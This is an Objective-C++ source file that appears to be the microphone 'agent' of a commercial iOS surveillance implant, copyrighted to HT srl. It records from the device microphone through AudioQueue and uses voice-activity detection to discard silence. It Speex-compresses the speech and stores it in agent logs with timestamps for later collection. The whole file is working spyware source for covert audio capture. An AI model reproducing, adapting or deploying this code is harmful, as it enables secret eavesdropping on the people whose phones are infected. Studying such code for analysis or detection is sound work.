/*
 * RCSIMicrophoneRecorder.mm
 *  Microphone Agent - recording backend
 *
 *
 * Created on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include "RCSIMicrophoneRecorder.h"
#include "RCSILogManager.h"
#include "RCSICommon.h"

#include "speex.h"

//#define DEBUG
//#define DEBUG_SPEEX
//#define DEBUG_ERRORS

static NSMutableData             *mAudioBuffer;

#ifdef DEBUG_ERRORS
static NSMutableData             *fileData = nil;
#endif

static NSLock *micLock;

// Determine the size, in bytes, of a buffer necessary to represent the supplied number
// of seconds of audio data.
int _i_MicrophoneRecorder::ComputeRecordBufferSize(const AudioStreamBasicDescription *format, float seconds)
{
	int packets, frames, bytes = 0;
	try {
		frames = (int)ceil(seconds * format->mSampleRate);
		
		if (format->mBytesPerFrame > 0)
			bytes = frames * format->mBytesPerFrame;
		else {
			UInt32 maxPacketSize;
			if (format->mBytesPerPacket > 0)
				maxPacketSize = format->mBytesPerPacket;	// constant packet size
			else {
				UInt32 propertySize = sizeof(maxPacketSize);
				AudioQueueGetProperty(mQueue,
                              kAudioQueueProperty_MaximumOutputPacketSize,
                              &maxPacketSize,
                              &propertySize);
			}
			if (format->mFramesPerPacket > 0)
				packets = frames / format->mFramesPerPacket;
			else
				packets = frames;	// worst-case scenario: 1 frame in a packet
			if (packets == 0)		// sanity check
				packets = 1;
			bytes = packets * maxPacketSize;
		}
	} catch (CAXException e) {
		//char buf[256];
		//fprintf(stderr, "Error: %s (%s)\n", e.mOperation, e.FormatError(buf));
		return 0;
	}	
	return bytes;
}

BOOL _i_MicrophoneRecorder::speexEncodeBuffer(void *input,
                                               u_int audioChunkSize,
                                               u_int channels,
                                               int fileCounter)
{
//#define SINGLE_LPCM_UNIT_SIZE 4 // sizeof(float)
#define SINGLE_LPCM_UNIT_SIZE 2 // sizeof(short)
  
  // Single lpcm unit already casted to SInt16
  SInt16 *bitSample;
  
  // Speex state
  void *speexState;
  char *source = (char *)input;
  
  SInt16  *inputBuffer;
  char    *outputBuffer;
  char    *ptrSource;
  
  SpeexBits speexBits;
  
  u_int frameSize       = 0;
  u_int i               = 0;
  u_int bytesWritten    = 0;
  
  // XXX: Hardcoded values
  u_int complexity      = 1;
  u_int quality         = 5;
  
  _i_LogManager *_logManager = [_i_LogManager sharedInstance];
  
  // Create a new wide mode encoder
  speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB));
  //speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_WB));
  
  // Set quality and complexity
  speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);
  speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
  
  speex_bits_init(&speexBits);
  
  // Get frame size for given quality and compression factor
  speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
  
  if (!frameSize)
    {
#ifdef DEBUG
      NSLog(@"Error while getting frameSize from speex");
#endif
      
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
#ifdef DEBUG
  NSLog(@"frameSize: %d", frameSize);
#endif
  
  //
  // Allocate the output buffer including the first dword (bufferSize)
  //
  if (!(outputBuffer = (char *)malloc(frameSize * SINGLE_LPCM_UNIT_SIZE + sizeof(u_int))))
    {
#ifdef DEBUG
      NSLog(@"Error while allocating output buffer");
#endif
      
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  //
  // Allocate the input buffer
  //
  if (!(inputBuffer = (SInt16 *)malloc(frameSize * sizeof(SInt16))))
    {
#ifdef DEBUG
      NSLog(@"Error while allocating input float buffer");
#endif
      
      free(outputBuffer);
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  //
  // Check for VAD
  //
  if (mIsVADActive)
    {
      short prevBitSample = 0;
      u_int zeroRate      = 0;
      
      for (ptrSource = source;
           ptrSource + (frameSize  * SINGLE_LPCM_UNIT_SIZE * channels) <= source + audioChunkSize;
           ptrSource += (frameSize * SINGLE_LPCM_UNIT_SIZE * channels))
        {
          bitSample = (SInt16 *)ptrSource;
          prevBitSample = bitSample[0];
          
          for (i = 1; i < frameSize; i++)
            {
              if (prevBitSample * bitSample[i] < 0)
                zeroRate++;
              
              prevBitSample = bitSample[i];
            }
        }
      
      float silencePresence = (float)(zeroRate / (audioChunkSize / (frameSize * SINGLE_LPCM_UNIT_SIZE)));
      
      if (silencePresence >= (float)mSilenceThreshold)
        {
#ifdef DEBUG
          NSLog(@"No voice detected, dropping the audio chunk");
#endif
          mLoTimestamp = 0;
          mHiTimestamp = 0;
          
          free(outputBuffer);
          speex_encoder_destroy(speexState);
          speex_bits_destroy(&speexBits);
          
          return FALSE;
        }
    }
  
  NSMutableData *tempData = [[NSMutableData alloc] init];
  
#ifdef DEBUG_SPEEX
  NSLog(@"%s Starting encoding", __FUNCTION__);
#endif

  //
  // We skip one channel by multiplying per channels inside the for condition
  // and inside the inner for with bitSample
  //
  for (ptrSource = source;
       ptrSource + (frameSize  * SINGLE_LPCM_UNIT_SIZE * channels) <= source + audioChunkSize;
       ptrSource += (frameSize * SINGLE_LPCM_UNIT_SIZE * channels))
    {
      bitSample = (SInt16 *)ptrSource;
      
      for (i = 0; i < frameSize; i ++)
        {
          // Just to avoid clipping on GSM with speex
          // 1.2db line loss
          inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
        }
      
      speex_bits_reset(&speexBits);
      speex_encode_int(speexState, inputBuffer, &speexBits);
      //speex_encode_int(speexState, bitSample, &speexBits);
      
      // Encode and store the result in the outputBuffer + first dword (length)
      bytesWritten = speex_bits_write(&speexBits,
                                      (char *)(outputBuffer + sizeof(u_int)),
                                      frameSize * SINGLE_LPCM_UNIT_SIZE);
      
      // If bytesWritten is greater than our condition, something wrong happened
      if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
        continue;
      
      // Store the audioChunk size in the first dword of outputBuffer
      memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
      
      //NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
      //                                                        length: bytesWritten + sizeof(u_int)];
      
      [tempData appendBytes: outputBuffer length: bytesWritten + sizeof(u_int)];
      
      //[_logManager writeDataToLog: tempData
      //                   forAgent: LOG_MICROPHONE
      //                  withLogID: fileCounter];
      
#ifdef DEBUG_ERRORS
      if (fileData == nil)
        fileData = [[NSMutableData alloc] init];
      
      [fileData appendData: tempData];
#endif
      
      //[tempData release];
      //usleep(2000);
    }
  
#ifdef DEBUG_SPEEX
  NSLog(@"%s Finished encoding", __FUNCTION__);
#endif
  
  [_logManager writeDataToLog: tempData
                     forAgent: LOG_MICROPHONE
                    withLogID: fileCounter];

  [tempData release];
#ifdef DEBUG_ERRORS
  time_t ut;
  time(&ut);
  
  NSString *outFile = [[NSString alloc] initWithFormat: @"/private/var/mobile/_i_phone/speexEncoded-%d.wav", ut];
  
  [fileData writeToFile: outFile
             atomically: YES];
  
  [outFile release];
  [fileData release];
  fileData = nil;
#endif
  
  free(inputBuffer);
  free(outputBuffer);
  
  speex_encoder_destroy(speexState);
  speex_bits_destroy(&speexBits);
 
#ifdef DEBUG_SPEEX
  NSLog(@"%s Returning TRUE", __FUNCTION__);
#endif
  
  return TRUE;
}

void _i_MicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
{
#ifdef DEBUG
  NSLog(@"createLogForBufferedAudio - fileNumber (%d)", fileNumber);
#endif
  
  microphoneAdditionalStruct *agentAdditionalHeader;
  /*
  CFURLRef url;
  
  NSString *recordFile = [NSTemporaryDirectory() stringByAppendingPathComponent: inRecordFile];	
  url = CFURLCreateWithString(kCFAllocatorDefault, (CFStringRef)recordFile, NULL);
  
  // create the audio file
  XThrowIfError(AudioFileCreateWithURL(url, kAudioFileWAVEType, &mRecordFormat, kAudioFileFlags_EraseFile,
                                       &mRecordFile), "AudioFileCreateWithURL failed");
  CFRelease(url);
  NSLog(@"File created on disk");
  
  // copy the cookie first to give the file object as much info as we can about the data going in
  // not necessary for pcm, but required for some compressed audio
  //CopyEncoderCookieToFile();
  NSLog(@"copyEncoderCookieToFile done");
  
  UInt32 bufLength = [mAudioBuffer length];
  
  XThrowIfError(AudioFileWriteBytes(mRecordFile, 0, 0, &bufLength, [mAudioBuffer bytes]),
                "AudioFileWriteBytes failed");

  NSLog(@"AudioFileWriteBytes done");
  
  //CopyEncoderCookieToFile();
  AudioFileClose(mRecordFile);
  */
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
                                        initWithLength: sizeof(microphoneAdditionalStruct)];
  agentAdditionalHeader = (microphoneAdditionalStruct *)[rawAdditionalHeader bytes];
  
  //time_t unixTime;
  //time(&unixTime);
  //int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  u_int _sampleRate = mRecordFormat.mSampleRate;
  _sampleRate |= LOG_AUDIO_CODEC_SPEEX;
  
  agentAdditionalHeader->version     = LOG_MICROPHONE_VERSION;
  agentAdditionalHeader->sampleRate  = _sampleRate;
  agentAdditionalHeader->hiTimestamp = mHiTimestamp;
  agentAdditionalHeader->loTimestamp = mLoTimestamp;
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_MICROPHONE
                           agentHeader: rawAdditionalHeader
                             withLogID: fileNumber];
  
  if (success == TRUE)
    {
#ifdef DEBUG
      NSLog(@"logHeader created correctly");
#endif
      [micLock lock];

      NSMutableData *_audioBuffer = [[NSMutableData alloc] initWithData: mAudioBuffer];
      [mAudioBuffer release];
      mAudioBuffer = [[NSMutableData alloc] init];
      
      [micLock unlock];
      
      speexEncodeBuffer([_audioBuffer mutableBytes],
                        [_audioBuffer length],
                        2,
                        fileNumber);
      
#ifdef DEPRECATED_CODE
      NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
      NSMutableData *audioData        = [[NSMutableData alloc] init];
      
      waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
      
      NSString *riff    = @"RIFF";
      NSString *waveFmt = @"WAVEfmt "; // w00t
      NSString *data    = @"data";
      
      int audioChunkSize = [_audioBuffer length];
      int fileSize = audioChunkSize + 44; // size of header + strings
      int fmtSize  = 16;

      waveFileHeader->formatTag       = 1;
      waveFileHeader->nChannels       = 2;
      waveFileHeader->nSamplesPerSec  = mRecordFormat.mSampleRate;
      waveFileHeader->bitsPerSample   = 16;
      waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
      waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
      
      //waveFileHeader->blockAlign      = waveFileHeader->nAvgBytesPerSec = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
      
      [audioData appendData: [riff dataUsingEncoding: NSUTF8StringEncoding]];
      [audioData appendBytes: &fileSize
                      length: sizeof(int)];
      [audioData appendData: [waveFmt dataUsingEncoding: NSUTF8StringEncoding]];
      
      [audioData appendBytes: &fmtSize
                      length: sizeof(int)];
      [audioData appendData: headerData];
      [audioData appendData: [data dataUsingEncoding: NSUTF8StringEncoding]];
      [audioData appendBytes: &audioChunkSize
                      length: sizeof(int)];
      
      // Append audio chunk
      [audioData appendData: _audioBuffer];
      
      //[audioData writeToFile: @"/private/var/mobile/_i_phone/temp.wav" atomically: YES];
      
      if ([logManager writeDataToLog: audioData
                            forAgent: LOG_MICROPHONE + fileNumber] == TRUE)
      
      [headerData release];
      [audioData release];
#endif
      
      [_audioBuffer release];
      [rawAdditionalHeader release];
      
      [logManager closeActiveLog: LOG_MICROPHONE withLogID: fileNumber];
    }
  
  //[mAudioBuffer release];
  //mAudioBuffer = [[NSMutableData alloc] init];
}

//
// AudioQueue callback function, called when an input buffers has been filled
//
void _i_MicrophoneRecorder::MyInputBufferHandler(void                                *inUserData,
                                                  AudioQueueRef                       inAQ,
                                                  AudioQueueBufferRef                 inBuffer,
                                                  const AudioTimeStamp                *inStartTime,
                                                  UInt32                              inNumPackets,
                                                  const AudioStreamPacketDescription  *inPacketDesc)
{
	_i_MicrophoneRecorder *aqr = (_i_MicrophoneRecorder *)inUserData;
  
	try {
		if (inNumPackets > 0) {
			// write packets to file
      
			//XThrowIfError(AudioFileWritePackets(aqr->mRecordFile, FALSE, inBuffer->mAudioDataByteSize,
      //                                    inPacketDesc, aqr->mRecordPacket, &inNumPackets, inBuffer->mAudioData),
      //              "AudioFileWritePackets failed");
      
      [micLock lock];
      [mAudioBuffer appendBytes: inBuffer->mAudioData
                         length: inBuffer->mAudioDataByteSize];
			aqr->mRecordPacket += inNumPackets;
      
      [micLock unlock];
		}
		
		// if we're not stopping, re-enqueue the buffer so that it gets filled again
		if (aqr->IsRunning())
			AudioQueueEnqueueBuffer(inAQ, inBuffer, 0, NULL);
	} catch (CAXException e) {
		//char buf[256];
		//fprintf(stderr, "Error: %s (%s)\n", e.mOperation, e.FormatError(buf));
	}
}

_i_MicrophoneRecorder::_i_MicrophoneRecorder()
{
	mIsRunning    = false;
	mRecordPacket = 0;
  mLoTimestamp  = 0;
  mHiTimestamp  = 0;
  
  mAudioBuffer = [[NSMutableData alloc] init];
  micLock = [NSLock new];
}

_i_MicrophoneRecorder::~_i_MicrophoneRecorder()
{
	AudioQueueDispose(mQueue, TRUE);
	AudioFileClose(mRecordFile);
  
  [micLock release];
  //if (mFileName)
    //CFRelease(mFileName);
}

// Copy a queue's encoder's magic cookie to an audio file.
void _i_MicrophoneRecorder::CopyEncoderCookieToFile()
{
	UInt32 propertySize;
	// get the magic cookie, if any, from the converter		
	OSStatus err = AudioQueueGetPropertySize(mQueue, kAudioQueueProperty_MagicCookie, &propertySize);
	
	// we can get a noErr result and also a propertySize == 0
	// -- if the file format does support magic cookies, but this file doesn't have one.
	if (err == noErr && propertySize > 0)
    {
      Byte *magicCookie = new Byte[propertySize];
      UInt32 magicCookieSize;
      AudioQueueGetProperty(mQueue, kAudioQueueProperty_MagicCookie,
                            magicCookie, &propertySize);
      magicCookieSize = propertySize;	// the converter lies and tell us the wrong size
      
      // now set the magic cookie on the output file
      UInt32 willEatTheCookie = false;
      
      // the converter wants to give us one; will the file take it?
      err = AudioFileGetPropertyInfo(mRecordFile, kAudioFilePropertyMagicCookieData, NULL, &willEatTheCookie);
      
      if (err == noErr && willEatTheCookie)
        {
          err = AudioFileSetProperty(mRecordFile, kAudioFilePropertyMagicCookieData, magicCookieSize, magicCookie);
          //XThrowIfError(err, "set audio file's magic cookie");
        }
      
      delete[] magicCookie;
    }
}

void _i_MicrophoneRecorder::SetupAudioFormat(UInt32 inFormatID)
{
  memset(&mRecordFormat, 0, sizeof(mRecordFormat));
  
  UInt32 size = sizeof(mRecordFormat.mSampleRate);
  AudioSessionGetProperty(kAudioSessionProperty_CurrentHardwareSampleRate,
                          &size, 
                          &mRecordFormat.mSampleRate);
  
  size = sizeof(mRecordFormat.mChannelsPerFrame);
  AudioSessionGetProperty(kAudioSessionProperty_CurrentHardwareInputNumberChannels,
                          &size,
                          &mRecordFormat.mChannelsPerFrame);
  
  mRecordFormat.mFormatID = inFormatID;
  
	if (inFormatID == kAudioFormatLinearPCM)
    {
      mRecordFormat.mFormatFlags      = kAudioFormatFlagIsSignedInteger | kAudioFormatFlagIsPacked;
      mRecordFormat.mChannelsPerFrame = 2;
      mRecordFormat.mFramesPerPacket  = 1;
      mRecordFormat.mBitsPerChannel   = 16;
      mRecordFormat.mBytesPerPacket   = mRecordFormat.mBytesPerFrame = (mRecordFormat.mBitsPerChannel / 8) * mRecordFormat.mChannelsPerFrame;
    }
}

void _i_MicrophoneRecorder::StartRecord()
{
	int i, bufferByteSize;
	UInt32 size;
	//CFURLRef url;
	
	try {		
		//mFileName = CFStringCreateCopy(kCFAllocatorDefault, inRecordFile);
    
		// specify the recording format
		SetupAudioFormat(kAudioFormatLinearPCM);
		
		// create the queue
		AudioQueueNewInput(&mRecordFormat,
                       MyInputBufferHandler,
                       this /* userData */,
                       NULL /* run loop */,
                       NULL /* run loop mode */,
                       0 /* flags */,
                       &mQueue);
		
		// get the record format back from the queue's audio converter --
		// the file may require a more specific stream description than was necessary to create the encoder.
		mRecordPacket = 0;
    
		size = sizeof(mRecordFormat);
		AudioQueueGetProperty(mQueue, kAudioQueueProperty_StreamDescription, 
                          &mRecordFormat, &size);
    
    //NSString *recordFile = [NSTemporaryDirectory() stringByAppendingPathComponent: (NSString*)inRecordFile];
    //url = CFURLCreateWithString(kCFAllocatorDefault, (CFStringRef)recordFile, NULL);
		
		// create the audio file
		//XThrowIfError(AudioFileCreateWithURL(url, kAudioFileWAVEType, &mRecordFormat, kAudioFileFlags_EraseFile,
    //                                     &mRecordFile), "AudioFileCreateWithURL failed");
		//CFRelease(url);
		
		// copy the cookie first to give the file object as much info as we can about the data going in
		// not necessary for pcm, but required for some compressed audio
		//CopyEncoderCookieToFile();
		
		// allocate and enqueue buffers
		bufferByteSize = ComputeRecordBufferSize(&mRecordFormat, kBufferDurationSeconds);	// enough bytes for half a second
		for (i = 0; i < kNumberRecordBuffers; ++i)
      {
        AudioQueueAllocateBuffer(mQueue, bufferByteSize, &mBuffers[i]);
        AudioQueueEnqueueBuffer(mQueue, mBuffers[i], 0, NULL);
      }
    
		// start the queue
		mIsRunning = true;
		AudioQueueStart(mQueue, NULL);
	}
	catch (CAXException &e) {
		//char buf[256];
		//fprintf(stderr, "Error: %s (%s)\n", e.mOperation, e.FormatError(buf));
	}
	catch (...) {
		//fprintf(stderr, "An unknown error occurred\n");
	}	
  
}

void _i_MicrophoneRecorder::StopRecord()
{
#ifdef DEBUG
  NSLog(@"_i_MicrophoneRecorder::StopRecord called");
#endif
  
	// end recording
	mIsRunning = false;
	AudioQueueStop(mQueue, true);
  
#ifdef DEBUG
  NSLog(@"AudioQueueStop called");
#endif
  
  // a codec may update its cookie at the end of an encoding session, so reapply it to the file now
	//CopyEncoderCookieToFile();
  
	//if (mFileName)
    //{
      //CFRelease(mFileName);
      //mFileName = NULL;
    //}
  
	AudioQueueDispose(mQueue, true);

#ifdef DEBUG
	NSLog(@"AudioQueueDispose - Stopped recording correctly");
#endif
  
  //AudioFileClose(mRecordFile);
}